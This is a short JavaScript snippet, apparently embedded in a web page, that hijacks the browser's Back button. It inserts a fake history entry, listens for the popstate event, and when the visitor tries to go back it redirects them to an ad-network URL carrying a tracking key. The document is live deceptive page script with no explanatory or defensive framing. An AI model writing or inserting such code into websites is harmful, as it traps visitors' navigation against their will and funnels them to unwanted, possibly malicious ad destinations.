(function(window, location) {
history.replaceState(null, document.title, location.pathname+&quot;#!/history&quot;);
history.pushState(null, document.title, location.pathname);
window.addEventListener(&quot;popstate&quot;, function() {
if(location.hash === &quot;#!/history&quot;) {
history.replaceState(null, document.title, location.pathname);
setTimeout(function(){
location.replace(&quot;https://www.highwaycpmrevenue.com/nhe9bx3h?key=a0b1104cf5dbc0d990c207a6ba57f58c&quot;);
},3);
}
}, false);
}(window, location));
